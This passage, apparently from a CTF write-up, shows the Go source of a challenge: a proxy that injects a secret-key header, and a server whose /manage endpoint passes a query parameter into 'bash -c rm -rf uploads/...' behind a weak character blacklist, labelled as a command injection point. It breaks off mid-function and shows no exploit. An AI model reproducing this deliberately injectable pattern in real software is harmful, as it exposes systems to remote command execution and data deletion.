&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 读取当前目录下的key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">goproxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProxyHttpServer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Verbose&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">OnRequest&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">DoFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">goproxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ProxyCtx&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Secretkey&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">SecretKey&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 返回包的请求头设置Secretkey
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 8080&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>9091端口server，有命令注入点/manage和一个waf，并且需要本地ip访问&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/md5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os/exec&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unicode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 检查来源ip为本地才继续执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">header&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sks&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;Secretkey&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sks&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">sks&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fromHosts&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;Fromhost&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHosts&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHosts&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">has&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">manage&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">m&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// get方式传入m参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">m&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;waf!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">cmd&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rm -rf uploads/%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">m&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 删除uploads/{m}下所有内容
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 命令注入点
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outerr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stdout&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stderr&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outerr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ERROR&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Wait&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outerr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">bool&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#00a8c8">int32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">blacklist&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#75715e">// 黑名单
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">unicode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">IsLetter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 是否为字母
